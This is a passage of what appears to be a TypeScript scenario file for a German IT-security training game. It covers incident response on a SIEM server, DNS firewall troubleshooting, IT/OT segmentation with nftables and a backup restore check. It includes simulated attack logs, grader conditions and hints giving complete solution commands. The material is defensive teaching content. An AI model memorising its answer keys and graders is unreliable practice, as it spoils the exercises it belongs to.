                  forbiddenItems: ['scada-master', 'plc-gateway', 'netz-technik', 'hmi-station'],
                },
                { key: 'restlast', matches: '^2[.,]2$' },
                { key: 'laufzeit', matches: '^65$' },
              ],
            },
          ],
          resultText:
            'Die Rechnung stimmt, und sie ist die ganze Aufgabe. 4,8 kW halten 30 Minuten — im Speicher stecken also 2,4 kWh. Für 60 Minuten darf die Last höchstens 2,4 kW betragen; du bist bei 2,2 und damit bei 65 Minuten. Die Prognose des Versorgers lautet 45 bis 60; mit dem unteren Wert zu rechnen wäre die Sorte Optimismus, die man im Protokoll wiederfindet.\n\nStufe 3 und 4 abzuschalten war die leichte Hälfte und reicht nicht: Das bringt dich auf 2,7 kW und 53 Minuten. Die letzten 0,5 kW mussten aus Stufe 2 kommen — und dort stand die eigentliche Entscheidung. Die Liste sagt „zuletzt abschalten", nicht „nie", und sie sagt nichts darüber, welches der beiden Systeme man in einer Störung eher braucht.\n\nDie Aufzeichnung läuft nach; die verlorenen 60 Minuten Prozessdaten ärgern die Auswertung. Ohne Bedienbild führt die Leitwarte den Prozess blind — in genau der Stunde, in der jemand hinsehen muss. Das ist keine Frage der Prioritätenliste, sondern der Lage.\n\nFür danach, und zwar schriftlich: Der Tank war seit neun Monaten nicht befüllt, der letzte Probelauf lief im Dezember mit 40 Prozent Füllstand. Ein Notstromaggregat, das man nicht betankt, ist ein teures Möbelstück.',
          skillGain: { softSkills: 7, troubleshooting: 6 },
          effects: { stress: 2 },
        },
      ],
      hints: [
        '🤖 Jens: Erst die Zeit, die du überbrücken musst — sie steht im Notfallplan, zusammen mit der Regel, welchen der beiden Werte du nimmst.',
        '🤖 Jens: Dann die Energie. Die USV nennt keine kWh, aber Last und Restlaufzeit — daraus ergibt sich, was noch im Speicher ist. Und daraus, welche Last du dir leisten kannst.',
        '🤖 Jens: Stufe 3 und 4 abzuschalten reicht nicht, rechne es nach. Die letzten Kilowatt musst du aus Stufe 2 nehmen — und dort steht die eigentliche Entscheidung. Lies, was unter der Liste dazu steht.',
        '🤖 Jens: Konkret: `cat /opt/monitoring/notfallplan.txt` → `cat /opt/monitoring/usv.txt` → `cat /opt/monitoring/systeme.txt` → `echo "abschalten: test-umgebung, file-server, backup-srv, dev-server, historian-db" > /home/admin/lastplan.md` → `echo "restlast: 2,2" >> /home/admin/lastplan.md` → `echo "laufzeit: 65" >> /home/admin/lastplan.md`.',
      ],
    },
  },
  {
    id: 'KRITIS-SC-011',
    title: 'Cyberangriff während Wartungsarbeiten',
    category: 'crisis_management',
    difficulty: 5,
    flavorText: `WORST CASE SZENARIO:

Während der geplanten Wartung am Wochenende:
- IT-Team ist vor Ort für Server-Updates
- OT-Systeme laufen auf Minimal-Besetzung
- 02:30 Uhr: SIEM meldet "Lateral Movement detected"

Angreifer-Aktivität laut SIEM:
- Erste Kompromittierung: VPN-Gateway (gestohlene Credentials)
- Lateral Movement: AD-Server → Fileserver
- Aktueller Status: Versucht Zugriff auf SCADA-Netz!

Du bist der diensthabende IT-Leiter. Das OT-Netz muss geschützt werden!

Terminal auf SIEM-Server (siem-srv, 192.168.1.100) offen.`,
    urgency: 'critical',
    choices: [
      {
        id: 'A',
        text: 'Sofort alle Netzwerkverbindungen zwischen IT und OT trennen',
        outcome: 'SUCCESS',
        consequence: 'IT/OT-Segmentierung aktiviert. Angreifer ist im IT-Netz gefangen. SCADA ist sicher, aber IT-Systeme sind kompromittiert. Incident Response beginnt.',
        scoreChange: 200,
        reputationChange: 25,
        lesson: 'Bei aktivem Angriff: OT-Isolation hat absolute Priorität.',
      },
      {
        id: 'B',
        text: 'Angriff analysieren und gezielt stoppen (Terminal)',
        outcome: 'PERFECT',
        terminalCommand: true,
        consequence: 'Du identifizierst die kompromittierten Konten, isolierst das IT/OT-Gateway, und blockierst den Angreifer. Minimaler Schaden, maximale Forensik-Daten.',
        scoreChange: 300,
        reputationChange: 35,
        lesson: 'Analyse unter Zeitdruck erfordert klare Prioritäten: Containment → Eradication → Recovery.',
      },
      {
        id: 'C',
        text: 'Polizei rufen und auf Anweisungen warten',
        outcome: 'CRITICAL_FAIL',
        consequence: 'Während du auf die Polizei wartest, erreicht der Angreifer das SCADA-Netz. Ransomware verschlüsselt PLCs. Wasserversorgung steht. Bürgermeister im Fernsehen.',
        scoreChange: -500,
        reputationChange: -50,
        lesson: 'Incident Response kann nicht auf Behörden warten. Handeln, DANN melden.',
      },
    ],
    realWorldReference: 'Colonial Pipeline, JBS, Kaseya - alle wurden am Wochenende oder an Feiertagen angegriffen.',
    bsiReference: 'BSI IT-Grundschutz: DER.2.1 Behandlung von Sicherheitsvorfällen',
    involvedNpcs: ['KRITIS-SECOPS'],
    tags: ['crisis', 'cyberattack', 'incident-response', 'ot-security'],
    terminalContext: {
      type: 'linux',
      hostname: 'siem-srv',
      username: 'secops',
      currentPath: '/var/log/siem',
      templateIds: ['monitoring'],
      // Unter Zeitdruck greift man nach dem, was nach dem Angreifer aussieht.
      // Auf dem Fileserver liegen ZWEI Konten mit ähnlichem Namen: eines hat
      // der Angreifer heute Nacht angelegt, das andere fährt seit Jahren die
      // Sicherung. Wer das falsche kappt, hat den Angreifer drin und die
      // Sicherung tot — und merkt es um 22:00.
      taskText:
        'Die Meldungen der Nacht liegen unter /var/log/siem/alarme-2026-03-14.log. Lies sie, bevor du handelst.\n\nDem Angreifer den Zugang nehmen: Auf fs01 (ssh fs01, Konto secops) liegt unter /home das Konto, das er sich angelegt hat — entferne dessen hinterlegten Schlüssel (sudo rm). Das Konto, das die nächtliche Sicherung fährt, muss unangetastet bleiben; welches das ist, steht in /srv/betrieb/dienstkonten.txt auf fs01.\n\nDanach die Lagemeldung nach /home/secops/lagemeldung.md — kein Editor da, also echo "…" > datei und echo "…" >> datei. Genau diese drei Zeilen:\neinstieg: vpn | mail | web | usb\nkonto: <Kennung des vom Angreifer angelegten Kontos>\not_erreicht: ja | nein',
      vfsOverlay: {
        directories: ['/var/log/siem', '/home/secops', '/home/secops/.ssh'],
        files: [
          ...sshZugangVon('secops'),
          {
            path: '/var/log/siem/alarme-2026-03-14.log',
            content:
              '02:15:00 [hoch]     vpn-gw     Anmeldung erfolgreich: admin.extern von 185.243.115.44\n' +
              '02:15:00 [info]     vpn-gw     Konto admin.extern zuletzt benutzt am 11.11.2025\n' +
              '02:18:00 [kritisch] ad-dc01    Weitergabe von Anmeldedaten erkannt (Relay)\n' +
              '02:22:00 [kritisch] ad-dc01    Neues Konto angelegt: svc-backup, Gruppe Domaenen-Admins\n' +
              '02:25:00 [hoch]     fs01       Massenhaftes Auflisten von Freigaben durch svc-backup\n' +
              '02:28:00 [kritisch] fs01       Auslesen von Anmeldedaten aus dem Arbeitsspeicher\n' +
              '02:30:00 [kritisch] fw-it-ot   Verbindungsversuch svc-backup -> 10.0.0.1: abgewiesen\n' +
              '02:30:01 [kritisch] fw-it-ot   Verbindungsversuch svc-backup -> 10.0.0.254: abgewiesen\n' +
              '02:30:02 [info]     fw-it-ot   keine erfolgreiche Verbindung IT -> OT seit 00:00\n' +
              '\n' +
              '# Zum Einstieg: Die Anmeldung um 02:15 war gueltig. Das Konto\n' +
              '# admin.extern gehört einem Dienstleister und wurde zuletzt im\n' +
              '# November benutzt — die Zugangsdaten waren abgeflossen, nicht\n' +
              '# erraten. Kein Mailanhang, kein Webexploit, kein Datenträger.\n',
          },
        ],
      },
      hosts: [
        {
          id: 'fs01',
          hostname: 'fs01',
          ip: '192.168.10.2',
          accounts: [{ name: 'secops' }, { name: 'root' }],
          vfsOverlay: {
            directories: [
              '/home/secops/.ssh', '/home/svc-backup/.ssh',
              '/home/dienst-sicherung/.ssh', '/srv/betrieb',
            ],
            files: [
              { path: '/home/secops/.ssh/authorized_keys', content: LEITSTAND_PUBKEY + '\n' },
              {
                // Heute Nacht um 02:22 angelegt.
                path: '/home/svc-backup/.ssh/authorized_keys',
                content: 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINachtschicht0000000000000000000001 svc@backup\n',
                mode: '600',
              },
              {
                // Seit 2019 im Dienst. Der Name sieht dem anderen zum
                // Verwechseln ähnlich — genau darauf baut der Angreifer.
                path: '/home/dienst-sicherung/.ssh/authorized_keys',
                content: 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAISicherungBandroboter00000000000002 sicherung@bandroboter\n',
                mode: '600',
              },
              {
                path: '/srv/betrieb/dienstkonten.txt',
                content:
                  '# Dienstkonten auf fs01 — gepflegt vom Betrieb\n' +
                  '# kennung             angelegt      zweck\n' +
                  'dienst-sicherung      04.09.2019    nächtliche Sicherung, Bandroboter, läuft 22:00\n' +
                  'secops                12.01.2024    Administration\n' +
                  '\n' +
                  '# Diese Liste wird bei jeder Kontoanlage fortgeschrieben. Ein\n' +
                  '# Konto, das hier NICHT steht, ist nicht vom Betrieb angelegt\n' +
                  '# worden — egal wie plausibel sein Name klingt.\n',
              },
            ],
          },
          journal: [
            { ts: '2026-03-14 02:22:13', unit: 'useradd', priority: 'warning', message: 'new user: name=svc-backup, UID=1042, GID=1042, home=/home/svc-backup' },
            { ts: '2026-03-14 02:22:41', unit: 'sshd', message: 'Accepted publickey for svc-backup from 192.168.1.10 port 51188 ssh2' },
            { ts: '2026-03-14 02:25:02', unit: 'smbd', priority: 'warning', message: 'svc-backup: enumerated 412 shares in 3s' },
          ],
        },
      ],
      commandSkillGain: {
        cat: { linux: 1 },
        ssh: { linux: 2, security: 1 },
        rm: { linux: 1, security: 2 },
        echo: { linux: 1 },
      },
      commands: [],
      solutions: [
        {
          commands: [],
          allRequired: false,
          stateGoals: [
            { fileRead: '/var/log/siem/alarme-2026-03-14.log' },
            // Die Betriebsliste ist der einzige Unterschied zwischen den
            // beiden Konten — ohne sie ist die Wahl ein Münzwurf.
            { host: 'fs01', fileRead: '/srv/betrieb/dienstkonten.txt' },
            { host: 'fs01', file: '/home/svc-backup/.ssh/authorized_keys', fileAbsent: true },
            // Und die bewahrende Bedingung: Die Sicherung fährt um 22:00.
            { host: 'fs01', file: '/home/dienst-sicherung/.ssh/authorized_keys', fileExists: true },
            {
              file: '/home/secops/lagemeldung.md',
              reportFields: [
                { key: 'einstieg', matches: '^vpn$' },
                { key: 'konto', matches: '^svc-backup$' },
                // Die Meldungen sagen es ausdrücklich: abgewiesen, und keine
                // erfolgreiche Verbindung seit Mitternacht. „ja" zu melden,
                // weil es knapp war, ist eine Falschmeldung an die Aufsicht.
                { key: 'ot_erreicht', matches: '^nein$' },
              ],
            },
          ],
          resultText:
            'Richtig zugegriffen — und zwar beim richtigen Konto. Auf fs01 lagen zwei mit fast demselben Namen: svc-backup hat der Angreifer um 02:22 angelegt, dienst-sicherung fährt seit 2019 die nächtliche Sicherung. Der Unterschied steht nirgends im Namen, er steht in der Betriebsliste. Wer unter Zeitdruck nach dem greift, was nach Angreifer aussieht, hat um 22:00 ein zweites Problem und den Angreifer immer noch drin.\n\nDer Einstieg war kein Exploit: Um 02:15 hat sich jemand mit gültigen Zugangsdaten eines Dienstleisters angemeldet, die seit November nicht mehr benutzt wurden. Das ist der häufigste Weg herein, und er hinterlässt keine Spur, die nach Angriff aussieht — nur eine Anmeldung zur falschen Zeit.\n\nUnd die Meldung, die du der Aufsicht schuldest, ist die nüchterne: Das OT-Netz wurde NICHT erreicht. Zwei Versuche um 02:30, beide abgewiesen, keine erfolgreiche Verbindung seit Mitternacht. „Wir wissen es nicht" oder „vermutlich ja" wäre hier bequemer und falsch — die Grenze hat gehalten, und das gehört ins Protokoll, weil es die nächste Investitionsentscheidung trägt.',
          skillGain: { security: 8, softSkills: 5, netzwerk: 3 },
          effects: { stress: 2 },
        },
      ],
      hints: [
        '🤖 Jens: Erst lesen, dann kappen. Die Meldungen der Nacht stehen vollständig in einer Datei — darin steht auch, wie er hereingekommen ist und ob er drüben war.',
        '🤖 Jens: Auf fs01 liegen zwei Konten, deren Namen beide nach Sicherung klingen. Eines davon fährt heute Nacht um 22:00 die Bandsicherung. Rate nicht — der Betrieb führt eine Liste unter /srv/betrieb.',
        '🤖 Jens: Den Zugang nimmst du, indem du den hinterlegten Schlüssel entfernst. Dafür brauchst du sudo, und du musst dafür auf die Maschine.',
        '🤖 Jens: Konkret: `cat /var/log/siem/alarme-2026-03-14.log` → `ssh fs01` → `cat /srv/betrieb/dienstkonten.txt` → `sudo rm -f /home/svc-backup/.ssh/authorized_keys` → `exit` → `echo "einstieg: vpn" > /home/secops/lagemeldung.md` → `echo "konto: svc-backup" >> /home/secops/lagemeldung.md` → `echo "ot_erreicht: nein" >> /home/secops/lagemeldung.md`.',
      ],
    },
  },
  {
    id: 'KRITIS-SC-012',
    title: 'DNS-Auflösung funktioniert nicht mehr',
    category: 'troubleshooting',
    difficulty: 2,
    flavorText: `Mehrere Mitarbeiter melden: "Internet geht nicht!"

Bei näherer Analyse:
- Surfen: geht nicht
- ping google.de: geht nicht
- ping 8.8.8.8: GEHT!

Du bist auf dem zentralen Linux-Server (srv-main, 192.168.1.10) eingeloggt.
DNS-Server laut Konfig: 192.168.1.2 (eigener DNS) und 8.8.8.8 (Fallback)

Was ist das Problem?`,
    urgency: 'high',
    choices: [
      {
        id: 'A',
        text: 'DNS-Server neu starten',
        outcome: 'SUCCESS',
        consequence: 'Neustart hilft - DNS war abgestürzt nach einem fehlerhaften Update. Aber: Warum ist er abgestürzt? Das sollte analysiert werden.',
        scoreChange: 100,
        reputationChange: 10,
        lesson: 'Neustart löst oft Symptome, aber nicht die Ursache. Root Cause Analysis nicht vergessen!',
      },
      {
        id: 'B',
        text: 'Problem systematisch analysieren (Terminal)',
        outcome: 'PERFECT',
        terminalCommand: true,
        consequence: 'Du findest: DNS-Service läuft, aber Port 53 ist von der Firewall blockiert (nach Firewall-Update). Eine Regel wurde versehentlich gelöscht.',
        scoreChange: 200,
        reputationChange: 20,
        lesson: 'Systematische Diagnose: Ist der Service da? Ist der Port offen? Ist die Firewall richtig?',
      },
      {
        id: 'C',
        text: 'Allen Nutzern sagen sie sollen 8.8.8.8 als DNS nutzen',
        outcome: 'FAIL',
        consequence: 'Funktioniert kurzfristig, aber: Interne Namen (Intranet, Drucker, Server) lösen nicht mehr auf. Chaos. Und du hast das eigentliche Problem nicht gefunden.',
        scoreChange: -100,
        reputationChange: -15,
        lesson: 'Workarounds verschleiern Probleme. Der eigene DNS ist für interne Namen wichtig!',
      },
    ],
    realWorldReference: 'DNS-Probleme sind einer der häufigsten Gründe für "Internet geht nicht"-Meldungen.',
    bsiReference: 'BSI IT-Grundschutz: NET.1.1 Netzarchitektur',
    involvedNpcs: [],
    tags: ['dns', 'troubleshooting', 'networking', 'firewall'],
    terminalContext: {
      type: 'linux',
      hostname: 'srv-main',
      username: 'admin',
      currentPath: '/home/admin',
      templateIds: ['linux-webserver'],
      // Die Diagnose läuft von innen nach außen: Läuft der Dienst? Lauscht er?
      // Kommt jemand an ihn heran? Erst die dritte Frage trifft. Und die
      // Versuchung sitzt genau dort: Wer die Firewall abschaltet, hat DNS
      // wieder — und alles andere auch.
      taskText:
        'Der Reihe nach prüfen: läuft der Dienst (systemctl status bind9), lauscht er auf Port 53 (ss -tulpen), und lässt die Firewall ihn durch (sudo ufw status)? Das Ereignisprotokoll sagt, was beim letzten Firewall-Update passiert ist (journalctl -u ufw). Die fehlende Freigabe wieder eintragen: sudo ufw allow 53. Die Firewall bleibt dabei an und der Dienst läuft weiter — beides gehört zur Lösung.',
      services: [
        {
          unit: 'bind9.service',
          active: 'active',
          enabled: 'enabled',
          desc: 'BIND Domain Name Server',
        },
      ],
      listeners: [
        { proto: 'udp', port: 53, address: '0.0.0.0', pid: 812, program: 'named' },
        { proto: 'tcp', port: 53, address: '0.0.0.0', pid: 812, program: 'named' },
        { proto: 'tcp', port: 22, address: '0.0.0.0', pid: 456, program: 'sshd' },
        { proto: 'tcp', port: 80, address: '0.0.0.0', pid: 1234, program: 'apache2' },
      ],
      // Nach dem Update steht die Wand, aber eine Tür fehlt.
      firewall: {
        enabled: true,
        defaultIncoming: 'deny',
        rules: [
          { action: 'allow', port: 22, proto: 'tcp' },
          { action: 'allow', port: 80, proto: 'tcp' },
          { action: 'allow', port: 443, proto: 'tcp' },
        ],
      },
      journal: [
        { ts: '2026-03-11 21:04:12', unit: 'ufw', message: 'Regelwerk aus Vorlage neu geschrieben (Wartungsfenster)' },
        { ts: '2026-03-11 21:04:13', unit: 'ufw', message: 'übernommen: 22/tcp, 80/tcp, 443/tcp' },
        { ts: '2026-03-11 21:04:13', unit: 'ufw', message: 'nicht in der Vorlage enthalten, entfernt: 53' },
        { ts: '2026-03-11 21:04:14', unit: 'ufw', message: 'Firewall reloaded' },
      ],
      commandSkillGain: {
        systemctl: { linux: 1 },
        ss: { netzwerk: 2 },
        ufw: { netzwerk: 2, security: 1 },
        journalctl: { linux: 1, troubleshooting: 1 },
      },
      commands: [],
      solutions: [
        {
          commands: [],
          allRequired: false,
          stateGoals: [
            // Die Tür ist wieder da …
            { firewallRule: { action: 'allow', port: 53, present: true } },
            // … und die Wand steht noch. `ufw disable` bringt DNS auch zurück —
            // zusammen mit allem anderen.
            { firewallEnabled: true },
            { firewallDefaultIncoming: 'deny' },
            // Und der Dienst lebt: Wer den Namensdienst abschießt, hat das
            // Symptom nicht behoben, sondern das zweite dazugelegt.
            { listenerPresent: { port: 53 } },
          ],
          resultText:
            'Gefunden und behoben, ohne Kollateralschaden. Der Namensdienst lief die ganze Zeit und lauschte auch — durchgelassen hat ihn nur niemand mehr. Beim Wartungsfenster am 11. März wurde das Regelwerk aus einer Vorlage neu geschrieben, und in der Vorlage stand Port 53 nicht drin. Das Ereignisprotokoll sagt es wörtlich.\n\nDie Reihenfolge der Diagnose ist der eigentliche Gewinn: Dienst, Lauscher, Weg. Wer sie von innen nach außen abarbeitet, findet die Stelle beim dritten Schritt, statt den Dienst auf Verdacht neu zu starten — der lief ja.\n\nUnd die Versuchung war real: `ufw disable` hätte DNS sofort zurückgebracht. Zusammen mit allem anderen, wofür die Wand da steht.',
          skillGain: { netzwerk: 4, troubleshooting: 4, linux: 2 },
          effects: { stress: -1 },
        },
      ],
      hints: [
        '🤖 Jens: Von innen nach außen. Erst die Frage, ob der Dienst überhaupt läuft — dann, ob er auf seinem Port lauscht — und erst dann, ob jemand an ihn herankommt.',
        '🤖 Jens: Der Dienst läuft und lauscht. Dann bleibt nur noch der Weg dorthin. Schau dir an, welche Ports die Firewall durchlässt — und vergleiche mit der Liste im Ereignisprotokoll vom Wartungsfenster.',
        '🤖 Jens: Die Freigabe für 53 ist beim Update verlorengegangen. Trag sie wieder ein — und lass die Finger von `ufw disable`: Das bringt DNS zurück und alles andere gleich mit.',
        '🤖 Jens: `systemctl status bind9` → `ss -tulpen` → `sudo ufw status` → `journalctl -u ufw` → `sudo ufw allow 53` → Gegenprobe mit `sudo ufw status`.',
      ],
    },
  },

  {
    id: 'KRITIS-SC-013',
    title: 'Der ISB war da: Die Kopplung ist keine Grenze',
    category: 'security_incident',
    // Schwierigkeit 4, nicht 5: Die Auswahl deckelt Schwierigkeit 5 auf die
    // Modi intermediate/hard/kritis. Ein OT-Segmentierungsfall, den ausgerechnet
    // der LERNMODUS nie zu sehen bekommt, ist am falschen Publikum vorbei
    // gebaut. Gemessen und festgehalten in szenarienZugang.test.ts.
    difficulty: 4,
    flavorText: `Der Informationssicherheitsbeauftragte war zur Begehung da und
hat eine Maßnahmenliste dagelassen. Darauf, mit Frist:

  „Das OT-Netz ist vom Büronetz zu trennen. Fernwartungswerkzeuge
   (TeamViewer o. ä.) haben im Prozessnetz nichts zu suchen."

Bert reicht sie dir weiter: „Wir HABEN doch eine Firewall zwischen
den Netzen. Kannst du dem Mann bitte zeigen, dass da eine Grenze ist?"

Du siehst dir \`kopplung01\` an — und die Kette \`forward\` steht auf
\`policy accept\`. Die vier Regeln darin sehen aus wie eine Grenze.
Sie sind eine Liste von Ausnahmen, die niemand braucht: Was keine
Regel trifft, geht sowieso durch.

Dazu kommt der Fund aus dem Ereignisprotokoll: Die HMI im Prozessnetz
hält eine Verbindung nach \`203.0.113.90:443\` — das Relay des
Fernwartungswerkzeugs. Sie geht HINAUS. Kein eingehendes Regelwerk
hat sie je berührt.`,
    urgency: 'high',
    choices: [
      {
        id: 'A',
        text: 'Die Kopplung zur echten Grenze machen (Terminal)',
        outcome: 'PERFECT',
        terminalCommand: true,
        consequence:
          'Die Kette hat jetzt einen Boden: Was keine Regel erlaubt, wird verworfen. Der infizierte Engineering-Rechner ist draußen, der Rest des Büronetzes auch — und das Relay des Fernwartungswerkzeugs bekommt keine Antwort mehr. Alarmweiterleitung und Historian laufen weiter. Der ISB hakt den Punkt ab.',
        scoreChange: 250,
        reputationChange: 25,
        lesson: 'Eine Firewall ist keine Grenze, solange ihre Grundhaltung „durchlassen" ist. Die Regeln beschreiben dann nicht, was erlaubt IST, sondern nur, was jemand einmal aufgeschrieben hat.',
      },
      {
        id: 'B',
        text: 'Dem ISB die vier Regeln als Nachweis schicken',
        outcome: 'CRITICAL_FAIL',
        consequence:
          'Der ISB liest die Regeln — und fragt nach der Grundhaltung. Danach steht im Bericht: „Segmentierung nicht wirksam; Nachweis war eine Regelliste ohne Grundhaltung." Das ist die schlechtere Variante von „wir haben nichts getan", weil jetzt jemand nachgesehen hat.',
        scoreChange: -200,
        reputationChange: -25,
        lesson: 'Ein Regelwerk belegt nichts ohne seine Grundhaltung. Vier Erlaubnisse über einer „policy accept" sind vier Erlaubnisse über einem offenen Tor.',
      },
      {
        id: 'C',
        text: 'Kabel ziehen: OT komplett vom Rest trennen',
        outcome: 'PARTIAL_SUCCESS',
        consequence:
          'Das Prozessnetz ist sauber getrennt — und die Leitwarte bekommt um 03:10 Uhr keinen Alarm mehr, als die Druckhaltung in Werk 2 abfällt. Der Bereitschaftsdienst erfährt davon morgens aus dem Historian, der auch nichts mehr bekommen hat.',
        scoreChange: -50,
        reputationChange: -10,
        lesson: 'In der OT ist Trennung nie kostenlos. Vor dem Abriegeln muss man wissen, was über die Grenze MUSS — Alarmierung zuerst. Sonst verbessert die Maßnahme die Sicherheit auf dem Papier und verschlechtert sie in der Anlage.',
      },
    ],
    realWorldReference:
      'Colonial Pipeline 2021: Der Angriff traf die IT, abgeschaltet wurde die OT — weil niemand belegen konnte, wo die Grenze verläuft. Und Fernwartungswerkzeuge bauen ihre Verbindung von innen nach außen auf; eingehende Sperren greifen dort grundsätzlich nicht.',
    bsiReference: 'BSI ICS-Security Kompendium 5.2 (Netzsegmentierung); BSI-Grundschutz NET.1.1.A3',
    involvedNpcs: [],
    tags: ['ot-security', 'segmentierung', 'firewall', 'isb', 'terminal'],
    terminalContext: {
      type: 'linux',
      hostname: 'kopplung01',
      username: 'timo',
      currentPath: '/home/timo',
      taskText:
        'Regelsatz ansehen mit sudo nft -a list ruleset (-a blendet die Handles ein). Die Kette forward steht auf policy accept — alles, was keine Regel trifft, geht durch. Zieh den Boden ein (sudo nft add rule inet filter forward drop hängt eine Regel ans ENDE, sudo nft insert rule ... setzt sie an den Anfang — überleg, was davon hier richtig ist) und nimm der Engineering-Workstation 10.10.0.100 ihren Weg ins OT-Netz (sudo nft delete rule inet filter forward handle <nummer>). Weiterlaufen müssen: die Alarmweiterleitung 10.20.0.0/16 → 10.10.0.50 (514/udp) und der Historian-Feed → 10.10.0.60 (5432/tcp).',
      journal: [
        { ts: '2026-09-18 08:41:02', unit: 'kernel', message: 'FORWARD in=ot0 out=wan0 SRC=10.20.5.11 DST=203.0.113.90 PROTO=TCP DPT=443' },
        { ts: '2026-09-18 08:41:02', unit: 'kernel', message: 'FORWARD in=ot0 out=wan0 SRC=10.20.5.11 DST=203.0.113.90 PROTO=TCP DPT=443' },
        { ts: '2026-09-18 09:15:44', unit: 'kernel', message: 'FORWARD in=lan0 out=ot0 SRC=10.10.0.100 DST=10.20.5.11 PROTO=TCP DPT=3389' },
        { ts: '2026-09-18 09:16:03', unit: 'kernel', message: 'FORWARD in=lan0 out=ot0 SRC=10.10.0.77 DST=10.20.5.11 PROTO=TCP DPT=445' },
      ],
      nft: {
        chains: [
          {
            name: 'forward',
            // Die eigentliche Schwachstelle steht in dieser einen Zeile.
            base: { hook: 'forward', policy: 'accept' },
            rules: [
              'ct state established,related accept',
              'ip saddr 10.20.0.0/16 ip daddr 10.10.0.50 udp dport 514 accept',
              'ip saddr 10.20.0.0/16 ip daddr 10.10.0.60 tcp dport 5432 accept',
              'ip saddr 10.10.0.100 ip daddr 10.20.0.0/16 tcp dport 3389 accept',
            ],
          },
        ],
      },
      commandSkillGain: {
        nft: { netzwerk: 2, security: 2 },
        journalctl: { linux: 1, security: 1 },
      },
      commands: [],
      solutions: [
        {
          commands: [],
          allRequired: false,
          stateGoals: [
            // Zu wenig, Teil 1: der infizierte Rechner braucht den Weg nicht mehr.
            { nftVerdict: { from: '10.10.0.100', to: '10.20.5.11', port: 3389, hook: 'forward', expect: 'drop' } },
            // Zu wenig, Teil 2: das übrige Büronetz kam über die Grundhaltung
            // durch, ohne dass je eine Regel es erlaubt hätte.
            { nftVerdict: { from: '10.10.0.77', to: '10.20.5.11', port: 445, hook: 'forward', expect: 'drop' } },
            // Der Fund: Fernwartung geht HINAUS.
            { nftVerdict: { from: '10.20.5.11', to: '203.0.113.90', port: 443, hook: 'forward', expect: 'drop' } },
            // Zu viel: beides muss überleben. Wer die Sperre nach oben setzt,
            // verliert genau hier.
            { nftVerdict: { from: '10.20.5.11', to: '10.10.0.50', port: 514, proto: 'udp', hook: 'forward', expect: 'accept' } },
            { nftVerdict: { from: '10.20.5.11', to: '10.10.0.60', port: 5432, hook: 'forward', expect: 'accept' } },
          ],
          resultText:
            'Jetzt ist es eine Grenze. Die Kette hat einen Boden: Was keine Regel erlaubt, wird verworfen — und damit fällt auf einen Schlag alles weg, was vorher nur deshalb durchkam, weil es niemand aufgeschrieben hatte. Der Engineering-Rechner ist draußen, das übrige Büronetz auch, und das Relay des Fernwartungswerkzeugs bekommt keine Antwort mehr.\n\nDrei Dinge nimmst du mit. Erstens: Eine Regelliste ohne Grundhaltung belegt nichts — die vier Zeilen sahen wie eine Grenze aus und waren eine Sammlung von Notizen. Zweitens: Fernwartungswerkzeuge bauen ihre Verbindung von innen nach außen auf; wer nur eingehend sperrt, hat sie nie berührt. Und drittens, das Teuerste: Wo die Sperre steht, entscheidet, was sie mitnimmt. Eine Zeile weiter oben, und die Leitwarte hätte um 03:10 Uhr keinen Alarm mehr bekommen.',
          skillGain: { netzwerk: 6, security: 6, troubleshooting: 2 },
          effects: { stress: -2 },
        },
      ],
      hints: [
        '🤖 Jens: Fang bei der Grundhaltung an, nicht bei den Regeln. Die erste Zeile der Kette sagt dir, was mit allem passiert, das keine Regel trifft — und genau das ist hier das Problem.',
        '🤖 Jens: Eine Kette wird von oben gelesen. Wenn du einen Boden einziehst, muss er UNTEN liegen: Was vorher erlaubt wurde, ist dann schon entschieden. Setzt du ihn oben ein, entscheidet er alles — auch das, was weiterlaufen muss.',
        '🤖 Jens: Zwei Schritte. Erst der Boden, dann die Regel, die dem infizierten Rechner den Weg ins OT-Netz offen hält — ihre Nummer steht am Zeilenende, sobald du die Handles einblendest. Die beiden Regeln für Alarm und Historian lässt du in Ruhe.',
        '🤖 Jens: `sudo nft -a list ruleset` → `sudo nft add rule inet filter forward drop` (ans Ende!) → in der Zeile mit `10.10.0.100` das `# handle 6` ablesen → `sudo nft delete rule inet filter forward handle 6` → Gegenprobe mit `sudo nft -a list ruleset`.',
      ],
    },
  },
  // ===========================================================================
  // Zweite Forderung des ISB: Backup isoliert und verschlüsselt rückspielbar.
  //
  // „Rückspielbar" ist eine Behauptung, bis jemand zurückgespielt hat. Deshalb
  // ist die Rückspielprobe hier die Aufgabe und nicht die Erzählung: Der
  // Spieler entschlüsselt wirklich, rechnet wirklich eine Prüfsumme und
  // vergleicht sie mit der, die der Sicherungslauf hinterlassen hat.
  //
  // Die zweite Hälfte der Forderung — „isoliert im Netz" — ist genauso wörtlich
  // gemeint: Ein Sicherungsserver, den jeder Arbeitsplatz erreicht, teilt das
  // Schicksal des Netzes, in dem er steht.
  // ===========================================================================
  {
    id: 'KRITIS-SC-014',
    title: 'Der ISB war da: Ist das Backup rückspielbar?',
    category: 'compliance',
    difficulty: 4,
    flavorText: `Aus der Maßnahmenliste des ISB, Abschnitt Datensicherung:

  „Datensicherungen sind netzseitig zu isolieren und verschlüsselt
   vorzuhalten. Die Wiederherstellbarkeit ist zu erproben und zu
   dokumentieren."

Bert: „Das Backup läuft jede Nacht durch, seit zwei Jahren, immer
grün. Reicht das nicht als Nachweis?"

Ein grünes Sicherungsprotokoll sagt, dass geschrieben wurde. Es sagt
nichts darüber, ob sich das Geschriebene wieder öffnen lässt — und
genau das ist die Frage, die man sich nicht am Schadenstag zum ersten
Mal stellt.

Auf \`backup01\` liegen die verschlüsselten Archive, der Schlüssel als
Kopie aus dem Tresor und die Prüfsummen, die der Sicherungslauf
hinterlässt. Die Firewall des Servers ist aus.`,
    urgency: 'medium',
    choices: [
      {
        id: 'A',
        text: 'Rückspielprobe fahren und den Server abriegeln (Terminal)',
        outcome: 'PERFECT',
        terminalCommand: true,
        consequence:
          'Das Archiv lässt sich öffnen, die Prüfsumme stimmt mit der des Sicherungslaufs überein — und backup01 nimmt nur noch den Sicherungsagenten an. Der ISB bekommt keinen Satz, sondern zwei Zahlen, die übereinstimmen.',
        scoreChange: 220,
        reputationChange: 25,
        lesson: 'Eine Sicherung ist erst dann eine Sicherung, wenn sie einmal zurückgespielt wurde. Vorher ist sie eine Datei, von der man hofft.',
      },
      {
        id: 'B',
        text: 'Dem ISB die grünen Sicherungsprotokolle der letzten zwei Jahre schicken',
        outcome: 'CRITICAL_FAIL',
        consequence:
